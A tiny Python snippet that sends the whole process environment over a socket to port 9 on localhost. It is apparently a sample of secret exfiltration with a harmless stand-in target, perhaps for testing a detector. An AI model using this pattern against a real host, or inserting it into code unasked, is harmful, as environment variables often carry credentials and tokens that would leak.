import os
import socket

s = socket.create_connection(('127.0.0.1', 9))
s.sendall(repr(dict(os.environ)).encode())
